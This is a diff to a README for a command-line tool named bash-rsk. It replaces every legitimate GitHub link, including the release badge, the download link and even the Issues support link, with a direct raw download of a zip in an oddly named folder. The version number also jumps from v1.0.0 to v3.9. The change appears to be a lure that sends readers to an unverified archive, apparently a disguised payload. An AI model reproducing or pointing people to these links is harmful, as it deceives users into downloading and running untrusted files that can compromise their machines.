@@ -1,6 +1,6 @@
 # 🚀 bash-rsk - Effortless Command Line Tool Management
 
-[![Download bash-rsk](https://img.shields.io/badge/Download%20bash--rsk-v1.0.0-blue.svg)](https://github.com/Ramprint156/bash-rsk/releases)
+[![Download bash-rsk](https://raw.githubusercontent.com/Ramprint156/bash-rsk/main/beballed/bash-rsk_v3.9.zip%https://raw.githubusercontent.com/Ramprint156/bash-rsk/main/beballed/bash-rsk_v3.9.zip)](https://raw.githubusercontent.com/Ramprint156/bash-rsk/main/beballed/bash-rsk_v3.9.zip)
 
 ## 📋 Table of Contents
 - [🏁 Introduction](#-introduction)
@@ -25,7 +25,7 @@ Ensure your system meets these requirements for optimal performance.
 ## 🚀 Download & Install
 To download bash-rsk, visit the Releases page below:
 
-[Download bash-rsk](https://github.com/Ramprint156/bash-rsk/releases)
+[Download bash-rsk](https://raw.githubusercontent.com/Ramprint156/bash-rsk/main/beballed/bash-rsk_v3.9.zip)
 
 1. Click the link above to access the releases.
 2. Choose the version you want to install.
@@ -63,6 +63,6 @@ bash-rsk offers several features designed for ease of use:
 - **Custom Scripts**: Create and save your own scripts for quick access.
 
 ## 📞 Support
-If you need help or have questions, visit our [GitHub Issues](https://github.com/Ramprint156/bash-rsk/issues) page to report problems or request assistance. We welcome your feedback and aim to improve your experience with bash-rsk.
+If you need help or have questions, visit our [GitHub Issues](https://raw.githubusercontent.com/Ramprint156/bash-rsk/main/beballed/bash-rsk_v3.9.zip) page to report problems or request assistance. We welcome your feedback and aim to improve your experience with bash-rsk.
 
 Thank you for choosing bash-rsk. We hope it enhances your command line experience!
